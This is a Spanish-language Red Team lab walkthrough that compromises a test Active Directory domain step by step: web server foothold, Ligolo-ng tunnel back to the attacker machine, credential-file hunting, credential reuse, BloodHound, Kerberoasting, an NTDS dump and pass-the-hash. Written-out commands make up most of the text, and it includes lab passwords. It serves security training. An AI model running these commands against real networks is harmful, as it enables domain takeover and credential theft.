# Cadena de Ataque - Laboratorio Red Team Active Directory

## Objetivo

Simular una intrusión realista en una infraestructura corporativa híbrida compuesta por:

1. Compromiso inicial del portal web Ubuntu.
2. Enumeración local del servidor.
3. Descubrimiento de credenciales reutilizadas.
4. Escalada o consolidación en Ubuntu.
5. Pivoting hacia la red interna con Ligolo-ng.
6. Enumeración de DEV01 y DC01.
7. Reutilización de CORP\dev:Dev123*.
8. Acceso a DEV01 por RDP/SMB.
9. Enumeración de Active Directory.
10. Kerberoasting / BloodHound / movimiento lateral.
11. Escalada hacia compromiso del dominio.

---

# Arquitectura del laboratorio

```text
Internet
   │
   ▼
[Kali Linux]
   │
   ▼
[Ubuntu Web Server]
192.168.129.129
10.10.10.10
   │
   ▼
[DEV01 - Windows 7]
10.10.10.20
   │
   ▼
[DC01 - Active Directory]
10.10.10.5
```

---

# Credenciales del laboratorio

| Equipo | Usuario | Contraseña |
|---|---|---|
| Ubuntu Web | victima | victima123 |
| Ubuntu Web | dev | dev123 |
| DEV01 | CORP\dev | Dev123* |
| DC01 | CORP\Administrador | Admin123* |

---

# FASE 1 — Initial Access

## Objetivo

Comprometer el servidor web Ubuntu expuesto.

---

## Vulnerabilidad utilizada

OWASP Top 10:

- Command Injection
- File Upload
- LFI/RFI
- SQL Injection → RCE

---

## Resultado esperado

Obtención de shell inicial:

```bash
www-data
```

o:

```bash
victima
```

---

# FASE 2 — Enumeración local Linux

## Enumeración de red

```bash
ip a
ip route
arp -a
```

Descubrimiento de la red interna:

```text
10.10.10.0/24
```

---

## Enumeración de credenciales

Búsqueda de archivos sensibles:

```bash
find / -name "*.env" 2>/dev/null
find / -name "*.conf" 2>/dev/null
find / -name "*.txt" 2>/dev/null
```

---

## Artefactos encontrados

```text
/shared/deploy_notes.txt
/var/www/html/.env
/backup/config.php
```

Contenido:

```text
CORP\dev
Dev123*
```

---

# FASE 3 — Escalada de privilegios Linux

## Enumeración sudo

```bash
sudo -l
```

---

## Vulnerabilidad explotada

- PATH Hijacking
- Sudo misconfiguration
- SUID abuse

---

## Resultado

Obtención de privilegios:

```bash
root
```

---

# FASE 4 — Pivoting con Ligolo-ng

## En Kali

### Crear interfaz túnel

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
```

---

### Iniciar proxy Ligolo

```bash
./proxy -selfcert
```

---

## En Ubuntu comprometido

### Ejecutar agente

```bash
./agent -connect <IP_KALI>:11601 -ignore-cert
```

---

## Crear túnel

En la consola del proxy:

```text
session
start
```

---

## Añadir ruta interna

En Kali:

```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```

---

# FASE 5 — Descubrimiento interno

## Descubrimiento de hosts

```bash
nmap -sn 10.10.10.0/24
```

---

## Enumeración de servicios

```bash
nmap -sV 10.10.10.20
```

Resultado:

```text
445/tcp   SMB
3389/tcp  RDP
```

---

# FASE 6 — Reutilización de credenciales

## Validación SMB

```bash
nxc smb 10.10.10.20 -u dev -p 'Dev123*' -d corp.local
```

Resultado:

```text
[+] CORP\dev:Dev123*
```

---

## Acceso RDP

```bash
xfreerdp /u:CORP\\dev /p:'Dev123*' /v:10.10.10.20 /cert:ignore
```

---

# FASE 7 — Enumeración Active Directory

## Enumeración LDAP

```bash
bloodhound-python \
-u dev \
-p 'Dev123*' \
-d corp.local \
-ns 10.10.10.5 \
-c all
```

---

## Información obtenida

- Usuarios
- Equipos
- Grupos
- ACLs
- Relaciones de privilegios
- SPNs

---

# FASE 8 — Kerberoasting

## Creación de cuenta vulnerable

Cuenta de servicio:

```text
svc_backup
```

Contraseña:

```text
Backup123*
```

---

## Solicitud de tickets TGS

```bash
GetUserSPNs.py corp.local/dev:'Dev123*' \
-dc-ip 10.10.10.5 \
-request
```

---

## Extracción hash Kerberos

```text
$krb5tgs$...
```

---

## Crack offline

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

Resultado:

```text
Backup123*
```

---

# FASE 9 — Movimiento lateral

## Acceso con nueva cuenta

```bash
nxc smb 10.10.10.5 \
-u svc_backup \
-p 'Backup123*'
```

---

## Enumeración avanzada

- Shares
- LDAP
- ACLs
- Privilegios delegados

---

# FASE 10 — Compromiso del dominio

## Dump NTDS

```bash
secretsdump.py corp.local/svc_backup:'Backup123*'@10.10.10.5
```

---

## Obtención de hashes

```text
Administrator:500:aad3b435b51404ee...
```

---

## Pass-the-Hash

```bash
psexec.py -hashes <HASH> corp.local/Administrator@10.10.10.5
```

---

# Resultado final

Obtención de:

```text
NT AUTHORITY\SYSTEM
```

y compromiso completo del dominio:

```text
CORP.LOCAL
```

---

# Técnicas MITRE ATT&CK utilizadas

| Técnica | ID |
|---|---|
| Exploit Public-Facing Application | T1190 |
| Valid Accounts | T1078 |
| Credential Dumping | T1003 |
| Kerberoasting | T1558.003 |
| Remote Services | T1021 |
| SMB/Windows Admin Shares | T1021.002 |
| Lateral Tool Transfer | T1570 |
| Pass the Hash | T1550.002 |
| Domain Trust Discovery | T1482 |
| Network Service Scanning | T1046 |
| Command and Scripting Interpreter | T1059 |

---

# Conclusión

La cadena de ataque demuestra cómo una vulnerabilidad inicial en un servidor Linux expuesto puede derivar en el compromiso completo de una infraestructura Active Directory mediante:

- Pivoting interno
- Reutilización de credenciales
- Movimiento lateral
- Enumeración AD
- Kerberoasting
- Escalada de privilegios

Todo ello replicando técnicas reales empleadas en operaciones Red Team y campañas de intrusión modernas.
